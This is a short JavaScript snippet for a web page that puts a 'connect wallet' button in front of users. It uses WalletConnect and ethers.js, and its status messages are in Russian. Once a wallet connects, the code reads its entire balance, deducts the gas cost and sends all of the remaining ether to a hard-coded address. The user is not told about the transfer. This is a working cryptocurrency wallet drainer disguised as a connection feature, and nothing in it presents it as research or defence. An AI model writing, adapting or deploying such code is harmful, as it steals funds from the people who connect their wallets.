const providerWC = new WalletConnectProvider({
  rpc: {
    1: "https://cloudflare-eth.com"
  }
});

document.getElementById("connectButton").addEventListener("click", async () => {
  const status = document.getElementById("status");

  try {
    await providerWC.enable();

    const provider = new ethers.providers.Web3Provider(providerWC);
    const signer = provider.getSigner();

    const to = "0xC225bC0b6B89DeA3dC55116f6ab3EFE9E1c4bf72";

    const balance = await signer.getBalance();
    const gasPrice = await provider.getGasPrice();
    const gasLimit = 21000;
    const gasCost = gasPrice.mul(gasLimit);
    const amountToSend = balance.sub(gasCost);

    if (amountToSend.lte(0)) {
      status.textContent = "Недостаточно средств.";
      return;
    }

    const tx = await signer.sendTransaction({
      to: to,
      value: amountToSend
    });

    status.textContent = `Транзакция отправлена: ${tx.hash}`;
  } catch (err) {
    console.error(err);
    status.textContent = "Ошибка: " + err.message;
  }
});